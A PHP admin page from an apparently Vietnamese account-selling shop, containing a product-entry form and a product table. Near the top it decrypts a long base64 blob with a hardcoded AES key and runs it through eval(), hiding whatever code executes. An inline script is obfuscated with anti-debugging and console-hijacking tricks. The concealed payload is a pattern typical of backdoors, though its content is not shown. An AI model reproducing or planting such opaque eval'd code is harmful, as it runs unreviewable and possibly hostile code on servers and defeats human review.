<?php
    require_once '../core/database.php';
    require_once 'header.php';
    if(empty($_SESSION['username'])){
    header('Location: /');exit;
}else{
if($data['admin'] == 1){
	//&& isset($_GET['category']) && isset($_GET['subcategory'])

if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
function e7061($e){
  $ed = base64_decode($e);
  $n = openssl_decrypt("$ed","AES-256-CBC","0914714172069208",0,"0914714172069208");
  return $n;
}
$e7091="d3E5VjZaVU1JVnNLbDh3Q2RhRGdpNFJvNzB2RVlKbHB1WXlTMndFUjUwOGQvNzdQYUJEcG5TVUlTamxIV2xjZ1hickVJMFdadS9mMk1wV2I1TUVKZm9LTWphdmhyZFFLd0hUZDhWTGJZcTFzN3VzMVhSUHc0Vm9wcFVXbUpkcGtuS1duWnZWdWUzVE9rRG1kM1A4VngzQ0NaajQvWlJsaUFPUGsrb0pFNU5oMW14cUxxRFFrTXZjMXd2ZEZieFhCNGNzd2dITllycnQvMDR3Z0tkVkhuS00zYlZnb05Yb0l6cEpaNTVCSkhWMVU0RjFNUzBHUkhIdDhQS0FIanVNNUp3bWVUSTAwZVROT0NzVTNmMUM0UWpBQVV0QVF2YlJMcmNtSENPYlg2eFRGZlJZcDAxRGUyVSswR1ZNWHNnZmlIUUM4emtwbldMYU5HUHNwT1M5bzQwbDlUWEVPQ1FSTytmbXR1dWg5T0NLR0hrT2ErNW5yMng2WE1ySFcvYlVBaUhvcUhKU0F2a3U2UzJrdFpPRjdtU0dqTUw5UnNtc3Q5ejFoNUhTdkFBVXVTRlJSeFhMWlZRTUE4NE9RbGpFRFh0MEwvMU1jV2Ztc0pLVVNBa3V3cDZ6RjdSOFkrL1FXTWxMNjUrYVIwZWlsL1hzUkJwYnNKaDFhRlo0UUVZVU56OWRFNGlzVllUUUVWWDYzNjl6TDk0VzA0alJJc0djS2xjaDlRYUg3dUwyQ3FXT3BrQXMrV0UwdWFqVXV1SzEzc01QYUt5R2hLMXM0S0NjV0tzVWdoN0JHalM3WFo1eWswTkpVV2J3MUdxY1o0ckFnS1FnT2cwTkVrNDRKTUIwUEJCQU0vaWQzY2h2bWN0SEpnUm8rYkhyR1hLVDBMdk9pMDdUZk5TOCtMVzEwQis3UEx4RFdTN0hjTFBUaVEzK0JUQ0ZjdHZxRUIzaE9WWXFXUDBBUFdNM0oxSkZTNVFrWlVsZjRDdFRLQURtTUpYWjlQZDNHWUVzUmFoRVo3VVNsN3VIL3l3bjl2azNCOWlOWjkyWWRDc0JCMjRCU0JVaXhGMzA0MzFpdXZ5Sm44QkxudmppQVowOTdFeFdtd2hvSW5wZktrSUlhY0pBM2VZVUNJN2FNYVFWR0tHVDR2b3NqK21oQUVCZUhPajB6QzgxT3lTSjR0dXQ4c1VSREJwZHNvSzVDR0drRWpDTDB2TENxcHhmci9URlRPTzFKYjV3TmNFR0NGeXdCQTNmLzJNd0ZMQU80M1pGVjV4aHVPeFh0NGZXR2ZVRmtRSkxwQlVHVFNOYTY3SktJb2hIL0tnY3JaNTFBaG5hM0FwVnhJdTRZcGVaa3h6MlVjbXBvTEFHbUZPK0dFQ2lGbWh1MVNneW1INjF5aW5rbWVTMkFZTmZZZEpNOG5rY2FEejVkUXA2THZQRzRrL1BJWHowdVVDQlpLUTJRRU9HZTJSSCtyZ3YyQTNqMm1zbkQ2dGdPU3JheFBFUlVheVFkR0p2dEk4YkNWUGxvbzdmZkRuWWdXVTJRMVYyNlVCNHFsYVV3S0pRWTNBRlM3ak5jVHRjYzJ5ejhldW84REVPeFo3SWdHbDNlTFo3MitPK1Z5RW56Wm9WbHZkMGhkeTh3cjFBYUgrVHZsMjFaaE16d29DRDFKQmJmMTUzMDVmaCtqV0h0cS9Gb0dHY0lBVHVJR1BpS1R5a3V5MTI5akFqUFk2RzAzRTEzWkhtSFphckxXV3FMWEh4TTArdXUyTFR3YUQ3RlErSkh0SDZURjBvTk9CRTdwbG1Za2laaXhJTHVUZ1A2UUlheDIzZHg5dWJaTjdSUnk4TUVxLzVVdE5vSmpjaXFaOVlVUXp5aXMxMXg5dUVQZzBLQmxaYmdscW82ZWE2TDNVcVgxNHBOci95ei90aVNaMHVJdWxlb2ZJWWhkbExIY2tGZ21ObWVyZ3F3K29yODEzb2t5eDl6dlNqYitid0YvWTJkRWFGMHRoM0J2MEZlUE5xS05ROGplN05ORnJyNWN4eHEvUUZDN3NnRUxzVFg0MUZSWXMvRHJrZk1LbHRvemlwVHR0ZkJCUy81NW45ZXhtblc2dDlEU3pxUTNnYnlXVHlZYysxUkFaQWYxUkpHY1I0WSt1dUFmTHVBZ1pING9MM0FRZlNmWEJ1UG1rcEwwVjdGR01ndUpGOU8wUXRxa21kTjMxbXJpa1hwbVJheEw4d1FIUFFjRWgzcWtZUitCUXVkRWhGalNqYW4yckVpZVptdG5CcnJjRS9TN2ZqVkNiN3p0b3ROMnRhYUVsMTJPNzJmZGRpanY0cCtadE96K2hEV1ZSZnl1SGdTQ1lBcm9QR3ZNbXE4NGJ0eWwySGsrSUdOaFovaHQxOWt6R0YzaTdRUVo2LzdsSVJmWHoxRlVyTjlaSTByaS8reEU4d09kcFErbEs4MDMzejBlaWg1OEJBUGM4SFREY0xLUnhlQXIxeThvWTYrK2ZuMUlONHhtKzdndCsyWkk1OUNWRnM2Z0g2UmxWVzcxSUx4a3hyVU85ZXJGR1RWMkFCUmt5SitXZEhTaFBzcEtweFpTckZMTFhoaW5ibWdQcXNUN2hQelUzL1VaSVpJRm1jYlY2WWZGK2lKeXlDa09DbTI1S2FWWTYwMEs0UHUyeWhPZTlKOExLV09Bb1dTOUFVMXNQditFNE9qUHdXakNlZ0J0QUYrNzd2N210LzR3cks0R0hUUWdtYmYyWFpPd0F1WUo3bUVGVXVqTExaNSs0dDFYMytDRFF0SXFpSFFTQ1VranAyY2pUNG4vK3lWbmFpY2JGU04vbTEza3Ewc2Q2bWFHWHNmcGUrZ2tSeDZnSFpDbFdSQlZwVWI5L3RnOWY4a05wU01uc1hIaTNYaXVxZTBZbmkyM2twaS9ObDg5T1VqY3VnTlUwd0dKZlExeUs0VVIzK1NCWEZLVFQvUnJ1QlVHaTRldDRMdVNyRHZXVmpyOUVRWnFmZ25xTVVpNGlDei9WUFhyeXRlYmFSS1hTM0poT2xBNGZHNE5NYlkvQjVBMjNTdUxZOSszS0M1aVExeEowUFJZWS9KVmdCbVRJN1RLY2Jhc0thZ2hFRGhRWkowdExEYWRUam5yUXJCbHdKTlFyek9uQzNBVE5SR3NDZ2ZlMHBDSHN6ejY1Y211UU9ZRzhkMmdsdEQ3MDU0YUZUSDUrbnh6bW55TlA1SnhoTGpWSlUwUHY4YnFZc08rd1QzNlA4eDcrNXZ3UC8xekI1b2J6dmovOWsxTWZXak9hSytuNVFRR3pPdkI4M2E5QkRrK2xOZklpbFBYbW50WUpjOXN6UEg4YkxVdzk2N0YvZ1loSnJLSHNIUVJFUlk1ZjA1QTVZMk1iNm5XdGs4VitHSWxVSE9pZllKWGhmZ2FNcXgxRk4zYWQ4aS9xZkhpOTByU2dCMXB4cEJYK0krc1RPZ1YzTk4zd1ozV1NKTDE1UUhMZFdPTzN6ZFNSSmFOb0pyVXhOeVF2R3ZHZWtHLy91SEdjUDk3Zmo2SG0xK1IvR2ZLY1dhV25lQ0t0M2F0QUttYUFUMFFidk5ROFB0SUNOM05wc3VHaFZ2OWtqV0VsaFFIaDB5ekVadmpUa3lVRU1PNW5wc3NNczdHcnVnOWhFVGpqbS9uUnBSeHFDSnNCTXdGeXc5dk1qZ2taOS82aVJrcm5nUmJXSDg3dHl2dUNlZ1ZIdkhpU3c1SVJWdDhXSStUYnRBM003OC9JY2xQQndhTW5DVzJDSzI5MklmTmtEcjBBVk0wV1RrYlZZSzROeUw2OEJ0ancrVmhndE1RekNaUm5tZGErdWZkNmZEeDhhUFpvUHZWRnpLZUtvMHN4OGR6Y3lmTWlacmtEeWx5Lys5UVdTbzM0ZHpObk9ZLzhsMGxobkhhRGMxb2xTc3FHZzBQZjBGeUFBNU5lNFpsVXJhdFBIOHQ1OFZEbGNxSlduQ1M4TEpEOThuejVIdCtMNDJXbGQ4R0Q5WHdiNXkxVlBtTUs5UkJSYlJHaXNVL2wzRXNpMHRFQ082Nk51NzQxQzh0b3RkOG9MbWZLRndYdVBCdlB4K2ZKVzIvalBTQis3OGJMZTM2MVd6VkxqWlZoV1hFMzVpNmo0b3VLTDVqVDltVXFPYm5jN3pIaktsYzM3S05HQ3NqRlpOL2x3OEFYRW5ta2VzNW9OZkl2eWo4cEpLWFVjZGFHUUVUMm1Ma1pUbDdQTXRGY2FVeEJiM1BtUkdCNUxoQnFML1NqYUJCeHJHRXpITTUrOTd6VHRvblkrbTMxczQwQ3p0NTc3UVQva1dSMDhIazVhZWpoTmlGSU0wemlEcWU2YzRqblpMZ1dlY1dSMmJiSFY0d0dhenp2eXVCa2YzdDNKQ1p3WWZSZkx5WGJma2UxY3p0TU5iOTBQbzA1R2doeDl6eGVGdmlPaFQ2SStlTEhWWFN4K0l0ZGxJV0NRNGJqQXFuS2RzdmpuaG9OV1c0YnA5bnluTEtseUE1VS9QaG11ZVFEbjlXVGU0blVLUXZldHlFc0xhbXdoUk1oSWNvTEVsaWkrRHdYRjZDTkY4czIvT1owZkU4Y2M2UklaUnYxWTFQT0RLSnNZY2VLbDlLVExrVElXSDFTSnFiRW0yTzBDL1BNMTVDeUloR2VIbWtvZzNqY2M4Q3hJcXlzdEQvOFgvMXNIOEdVYnFGWDBWOG1kMWNRemRWNWRGbnpOYWZpTVlKUHRTeDYxODc2WHo4azlkaW8vOTl2aVBoSFBXWW9nbldqM1JNZWVFM1loZ2RLNFFHbi9YUmdIR2MxTnpQdTZkdDhZdGtzRk5weWl6alc0UE0zdzIxZEkxZU1MRFpOMkFBcExBWmVMdEg0eVdXUFYySmtRZ0lUUzBoVXlwbStsTzNnMUhNSWlXV2pVWXRnQjlvRzJDQkQveXViak1LVjZhcDhNYytsQUdITU4vZzNjZzJBa3I2emZZcy9ScHdYT0pEU2MwbVNvUDZ2aktGcnJHOVEyYTlRd3lFTXRMYjFyWXVhaWNLWUgxZUE3dkN3OVRUQ2g3MnllT2RQUFhJZ3ZuSWtaQ1pUZ2NHZ3NmZHNIeUtpenZuZUc0aVZ4V0ZqZlZPYzZhYkhtNnN6UUFFdUxJNi8vTkcwTWtRQXljbm1yUitMUzl5aGJ4Unh5a0twbGdkMmxBVzMvWHlBdXdXd0kyVjA1OXl0cmFPUXltWldxYjhmVlRRZTQwSlM4VnY2Vk1uQnhiYnMrM3pBMFNuN0ZzdWhmcUpDdHRVemlEbGZNbFcwSjhqWlpqOUpLTC9mR1VJbi8wTlJFK01jWTNKSXdsSEFZQlB3PT0=";eval(e7061($e7091));
?>





<div class="content-wrapper">
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1>Thêm tài khoản</h1>
                </div>
            </div>
        </div>
    </section>
    <section class="content">
        <div class="row">
            <div class="col-md-12">
                <div class="card card-outline card-primary">
                    <div class="card-header">
                        <h3 class="card-title">THÊM SẢN PHẨM</h3>
                        <div class="card-tools">
                            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i
                                    class="fas fa-minus"></i>
                            </button>
                        </div>
                    </div>
                    <div class="card-body">
                         <form action="" method="post">

                            <div class="form-group">
		                  <label>Danh Mục Chính:</label>
		                  <select class="form-control" id="category" name="category" onChange="getSubCat(this.value);">
		                    <option value="">Chọn Danh Mục Chính</option>
		                    <?php
		                    // Feching active categories
		                    $ret=mysqli_query($conn,"select id,CategoryName from tscategory where Is_Active=1 ORDER BY CategoryName ASC");
		                    while($result=mysqli_fetch_array($ret))
		                    {    
		                    ?>
		                    <option value="<?php echo htmlentities($result['id']);?>"><?php echo htmlentities($result['CategoryName']);?></option>
		                    <?php } ?>

		                    </select> 
		                </div>
		                <div class="form-group">
		                  <label>Danh Mục Phụ:</label>
		                  <select class="form-control" id="subcategory" name="subcategory">                        
		                  </select> 
		                  </div>
		                <div class="form-group">
				            <label for="">Dữ Liệu Sản Phẩm:</label>
				            <textarea class="form-control" id="list" name="list" rows="5" placeholder="1 dòng 1 tài khoản" required></textarea>
				        </div>  
                        
                            <button type="submit" id="them-san-pham" name="them-san-pham" class="btn btn-primary btn-block" >Thêm <em class="fa fa-paper-plane"></em></button>
                        </form>
                    </div>
                </div>
                <div class="card card-primary">
    <div class="card-header"><h3>Quản Lý Sản Phẩm</h3>
    </div>
    <hr>
    <div class="box-body">
        <div class="table-responsive"> 
                  <table id="example12" class="table table-bordered table-striped dataTable" role="grid" aria-describedby="example12_info">
                    <thead>
                      <tr>
                        <th>#ID</th>
                        <th>Nội dung </th>
                        <th>Chuyên mục chính</th>
                        <th>Chuyên mục phụ</th>
                        <th>Ngày tạo</th> 
                        <th>Giá tiền</th>
                        <th>Trạng Thái</th>
                        <th>Xoá </th>
                      </tr>
                    </thead>
                    
                  </table>
          </div>
    </div>
</div>

            </div>
        </div>
    </section>
</div>

<script >
function _0x2b9d(){var _0x283416=['search','stateObject','warn','info','subcategories','#example12','return\x20(function()\x20','test','constructor','sanpham','toString','35OuWPnt','init','chain','\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','8plKoNm','22KHxCMp','129703UVSRMP','xoa','error','trangthai','ready','categories','action','exception','{}.constructor(\x22return\x20this\x22)(\x20)','24732RgcphK','call','length','13WIqjqj','../Query/Get-Product.html','31638YBjhse','string','81QFjxLv','while\x20(true)\x20{}','28wFxPDy','apply','14PgUSaX','3543638CkoVUN','21690BWRNMy','table','prototype','369uNismp','1147584NgRrws','bind','console','__proto__','debu','trace'];_0x2b9d=function(){return _0x283416;};return _0x2b9d();}var _0x55e1d3=_0x2eac;(function(_0x4fdb3d,_0x340739){var _0x5d5264=_0x2eac,_0x23d79d=_0x4fdb3d();while(!![]){try{var _0x537cc8=parseInt(_0x5d5264(0xd1))/0x1*(parseInt(_0x5d5264(0xd5))/0x2)+-parseInt(_0x5d5264(0xfb))/0x3*(-parseInt(_0x5d5264(0xd3))/0x4)+parseInt(_0x5d5264(0xec))/0x5*(parseInt(_0x5d5264(0xcf))/0x6)+-parseInt(_0x5d5264(0xf2))/0x7*(parseInt(_0x5d5264(0xf0))/0x8)+parseInt(_0x5d5264(0xda))/0x9*(parseInt(_0x5d5264(0xd7))/0xa)+-parseInt(_0x5d5264(0xf1))/0xb*(-parseInt(_0x5d5264(0xdb))/0xc)+parseInt(_0x5d5264(0xfe))/0xd*(-parseInt(_0x5d5264(0xd6))/0xe);if(_0x537cc8===_0x340739)break;else _0x23d79d['push'](_0x23d79d['shift']());}catch(_0x1ade53){_0x23d79d['push'](_0x23d79d['shift']());}}}(_0x2b9d,0x19535));var _0xacc668=(function(){var _0x1aa944=!![];return function(_0x18be28,_0x50e824){var _0xc609fc=_0x1aa944?function(){if(_0x50e824){var _0x842030=_0x50e824['apply'](_0x18be28,arguments);return _0x50e824=null,_0x842030;}}:function(){};return _0x1aa944=![],_0xc609fc;};}()),_0x2710ac=_0xacc668(this,function(){var _0x306be7=_0x2eac;return _0x2710ac['toString']()['search']('(((.+)+)+)+$')[_0x306be7(0xeb)]()[_0x306be7(0xe9)](_0x2710ac)[_0x306be7(0xe1)]('(((.+)+)+)+$');});_0x2710ac();function _0x2eac(_0x2c016f,_0xf906a6){var _0x2f3d01=_0x2b9d();return _0x2eac=function(_0xf8caea,_0x292914){_0xf8caea=_0xf8caea-0xce;var _0x1cdeed=_0x2f3d01[_0xf8caea];return _0x1cdeed;},_0x2eac(_0x2c016f,_0xf906a6);}var _0x371ac0=(function(){var _0x5504d9=!![];return function(_0x25a9e5,_0x2fed26){var _0x4810d5=_0x5504d9?function(){if(_0x2fed26){var _0x4a11a7=_0x2fed26['apply'](_0x25a9e5,arguments);return _0x2fed26=null,_0x4a11a7;}}:function(){};return _0x5504d9=![],_0x4810d5;};}());(function(){_0x371ac0(this,function(){var _0x1fdf7b=_0x2eac,_0x356209=new RegExp('function\x20*\x5c(\x20*\x5c)'),_0xeef9a5=new RegExp(_0x1fdf7b(0xef),'i'),_0x3924ed=_0x363432(_0x1fdf7b(0xed));!_0x356209['test'](_0x3924ed+_0x1fdf7b(0xee))||!_0xeef9a5[_0x1fdf7b(0xe8)](_0x3924ed+'input')?_0x3924ed('0'):_0x363432();})();}());var _0x292914=(function(){var _0x584246=!![];return function(_0xb17411,_0x46f427){var _0x3099d6=_0x584246?function(){if(_0x46f427){var _0x677a02=_0x46f427['apply'](_0xb17411,arguments);return _0x46f427=null,_0x677a02;}}:function(){};return _0x584246=![],_0x3099d6;};}()),_0xf8caea=_0x292914(this,function(){var _0x595207=_0x2eac,_0x1d6b4d;try{var _0xd36f59=Function(_0x595207(0xe7)+_0x595207(0xfa)+');');_0x1d6b4d=_0xd36f59();}catch(_0x11d624){_0x1d6b4d=window;}var _0x3ab950=_0x1d6b4d[_0x595207(0xdd)]=_0x1d6b4d['console']||{},_0x4e58d8=['log',_0x595207(0xe3),_0x595207(0xe4),_0x595207(0xf4),_0x595207(0xf9),_0x595207(0xd8),_0x595207(0xe0)];for(var _0x155692=0x0;_0x155692<_0x4e58d8[_0x595207(0xfd)];_0x155692++){var _0x3920a3=_0x292914[_0x595207(0xe9)][_0x595207(0xd9)][_0x595207(0xdc)](_0x292914),_0x3bc8b8=_0x4e58d8[_0x155692],_0x510bf8=_0x3ab950[_0x3bc8b8]||_0x3920a3;_0x3920a3[_0x595207(0xde)]=_0x292914['bind'](_0x292914),_0x3920a3[_0x595207(0xeb)]=_0x510bf8[_0x595207(0xeb)][_0x595207(0xdc)](_0x510bf8),_0x3ab950[_0x3bc8b8]=_0x3920a3;}});_0xf8caea(),$(document)[_0x55e1d3(0xf6)](function(){var _0x5eca1d=_0x55e1d3,_0x393751=$(_0x5eca1d(0xe6))['dataTable']({'columns':[{'data':'id'},{'data':_0x5eca1d(0xea)},{'data':_0x5eca1d(0xf7)},{'data':_0x5eca1d(0xe5)},{'data':'time'},{'data':'giatien'},{'data':_0x5eca1d(0xf5)},{'data':_0x5eca1d(0xf3)}],'processing':!![],'serverSide':!![],'orderCellsTop':!![],'fixedHeader':!![],'paging':!![],'lengthChange':!![],'searching':!![],'ordering':!![],'info':!![],'autoWidth':![],'responsive':!![],'order':[[0x0,'desc']],'ajax':{'url':_0x5eca1d(0xce),'type':'POST'}});});function _0x363432(_0xcf0f75){function _0x553c39(_0x5ae1ca){var _0x2aa6f1=_0x2eac;if(typeof _0x5ae1ca===_0x2aa6f1(0xd0))return function(_0x4d70e5){}['constructor'](_0x2aa6f1(0xd2))[_0x2aa6f1(0xd4)]('counter');else(''+_0x5ae1ca/_0x5ae1ca)[_0x2aa6f1(0xfd)]!==0x1||_0x5ae1ca%0x14===0x0?function(){return!![];}[_0x2aa6f1(0xe9)](_0x2aa6f1(0xdf)+'gger')[_0x2aa6f1(0xfc)](_0x2aa6f1(0xf8)):function(){return![];}[_0x2aa6f1(0xe9)](_0x2aa6f1(0xdf)+'gger')[_0x2aa6f1(0xd4)](_0x2aa6f1(0xe2));_0x553c39(++_0x5ae1ca);}try{if(_0xcf0f75)return _0x553c39;else _0x553c39(0x0);}catch(_0x5d1797){}}

</script>

 <script>
function getSubCat(val) {
  $.ajax({
  type: "POST",
  url:'<?php echo 'https://'.$_SERVER['HTTP_HOST'] ?>/Query/CheckSub.html',
  data:'catid='+val,
  success: function(data){
    $("#subcategory").html(data);
  }
  });
  }
  </script>
  <script type="text/javascript">
$(document).ready(function()
  {
$("#example1").on('click', '.catesttpost', function(){
        var id = $(this).attr('id');
        var title = $(this).attr('alt');
        var data = 'id=' + id ;
        var parent = $(this).parent().parent();
  swal({
    title: 'Cập nhập bài viết \n " ' + title +' "  ',
    text: 'Bạn có muốn cập nhập bài viết thành công khai?',
    type: 'warning',
    showCancelButton: true,
    confirmButtonColor: '#DD6B55',
    confirmButtonText: 'Vâng, Tôi muốn !',
    cancelButtonText: "Không, Hủy bỏ !",
    closeOnConfirm: false,
    closeOnCancel: false
  },
   function(isConfirm){    
    if (isConfirm){
      swal("Thành Công!", "Bài viết đã được cập nhập công khai", "success");
        $.ajax(
        {
            type: "POST",
             url:'<?php echo 'https://'.$_SERVER['HTTP_HOST'] ?>/Query/Product-Show.html',
             data: data,
             cache: false,
             success: function()
             {
              parent.fadeIn('slow', function() {location.reload(true);});
             }
         });
    } 
    else {
      swal("Hủy Bỏ", "Quá trình đã bị dừng lại :)", "error"); 
    }
  });     
      });
    });

  $(document).ready(function()
  {
$("#example1").on('click', '.catestthide', function(){
        var id = $(this).attr('id');
        var title = $(this).attr('alt');
        var data = 'id=' + id ;
        var parent = $(this).parent().parent();
  swal({
    title: 'Cập nhập bài viết \n " ' + title +' "  ',
    text: 'Bạn có muốn Ẩn bài viết này?',
    type: 'warning',
    showCancelButton: true,
    confirmButtonColor: '#DD6B55',
    confirmButtonText: 'Vâng, Tôi muốn !',
    cancelButtonText: "Không, Hủy bỏ !",
    closeOnConfirm: false,
    closeOnCancel: false
  },
   function(isConfirm){    
    if (isConfirm){
      swal("Thành Công!", "Bài viết đã được Ẩn thành công", "success");
        $.ajax(
        {
            type: "POST",
             url:'<?php echo 'https://'.$_SERVER['HTTP_HOST'] ?>/Query/Product-Hide.html',
             data: data,
             cache: false,
          
             success: function()
             {
              parent.fadeIn('slow', function() {location.reload(true);});
             }
         });
    } 
    else {
      swal("Hủy Bỏ", "Quá trình đã bị dừng lại :)", "error"); 
    }
  });     
      });
    });

</script>
  <!-- /.content-wrapper -->
  <footer class="main-footer">
    <strong>Copyright &copy; 2020 <a href="#"><?= $setup['name-footer']; ?></a>.</strong>
    All rights reserved.
    <div class="float-right d-none d-sm-inline-block">
      <b>Version</b> 3.1.0-rc
    </div>
  </footer>
  <!-- Control Sidebar -->
  <aside class="control-sidebar control-sidebar-dark">
    <!-- Control sidebar content goes here -->
  </aside>
  <!-- /.control-sidebar -->
</div>


</body></html>
<?php
require_once 'script.php';
}
else{
    require_once '../pages/404.php';
    
}
}

?>